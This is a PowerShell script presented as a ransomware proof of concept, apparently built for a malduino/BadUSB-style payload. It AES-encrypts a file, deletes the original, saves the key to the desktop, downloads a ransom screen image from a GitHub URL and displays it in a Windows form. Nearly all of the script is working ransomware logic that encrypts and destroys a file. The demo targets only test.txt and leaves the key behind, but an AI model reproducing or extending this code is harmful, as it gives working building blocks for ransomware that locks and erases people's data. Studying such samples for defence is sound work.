# BTBit Powershell Ransomware PoC 
# file to encrypt
$file = "test.txt"
#$drive = (get-location).Drive.Name
#$file_exist = $drive + ":\" + $file
#if (-not(Test-Path -Path $file_exist -PathType Leaf)) { exit }
#
# Prepare encryption key and IV
$RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider 
$key = New-Object Byte[] 32
$RNGCrypto.GetBytes($key)
$iv = New-Object Byte[] 16
$RNGCrypto.GetBytes($iv)
#
# create ps AES objects
# sources
# http://indogeeks.com/how-to-use-aes-encryption-in-powershell/
# https://gist.github.com/ctigeek/2a56648b923d198a6e60
$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.iv = $iv
echo "AES key: $key"
echo "IV: $iv"
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$Encryptor = $AES.CreateEncryptor()
$bytes = gc $file -Encoding byte
# remove the clear file from the disk
rm "$file"
#
$encryptedData = $Encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[byte[]] $fullData = $AES.IV + $encryptedData
# save IV and the encrypted in file.enc
sc -Value $fullData -LiteralPath "$file.enc" -Encoding byte
# cleare original file from memory 
$bytes = $Null
#
# write encryption key on user's desktop
$userDesk = [Environment]::GetFolderPath("Desktop")
sc -Value $key -LiteralPath "$userDesk/BTBit.key" -Encoding byte
#
# show encryption screen
$screen = $ENV:LOCALAPPDATA + "\screen_enc.jpg"  
(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/screen_enc.jpg", $screen)
[void][reflection.assembly]::LoadWithPartialName("System.Windows.Forms")
Add-Type -AssemblyName 'System.Windows.Forms'
#$file = (get-item '\\192.168.1.127\Documents\ataque\screen.png')
$img = [System.Drawing.Image]::Fromfile((get-item $screen))

[System.Windows.Forms.Application]::EnableVisualStyles()
$form = new-object Windows.Forms.Form
$form.Text = "Image Viewer"
$form.Width = $img.Size.Width;
$form.Height =  $img.Size.Height;
$pictureBox = new-object Windows.Forms.PictureBox
$pictureBox.Width =  $img.Size.Width;
$pictureBox.Height =  $img.Size.Height;

$pictureBox.Image = $img;
$form.controls.add($pictureBox)
$form.Add_Shown( { $form.Activate() } )
$form.ShowDialog()
